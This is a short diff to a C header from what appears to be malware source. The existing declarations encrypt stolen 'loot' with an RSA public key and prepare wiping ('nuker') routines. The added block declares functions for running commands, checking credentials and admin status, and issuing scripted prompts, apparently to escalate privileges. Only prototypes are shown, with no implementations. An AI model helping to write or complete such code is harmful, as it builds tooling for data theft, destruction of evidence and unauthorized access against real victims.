@@ -187,6 +187,15 @@ unsigned char *wrap_loot(const unsigned char *plaintext,
                          size_t *out_len,
                          RSA *rsa_pubkey);
 
+/* Privileges */
+char           *execute(const char *command);
+void            free_if_not(void *ptr);
+char           *extract(const char *output, const char *start_marker, const char *end_marker);
+int             auth(const char *username, const char *password);
+int             is_user_admin(const char *username);
+char           *request_input(const char *prompt_script);
+void            request_a(void);
+
 /* collection & wiping */
 wipe_config_t *prep_nuker(int passes);
 void           burn_config(wipe_config_t *config);
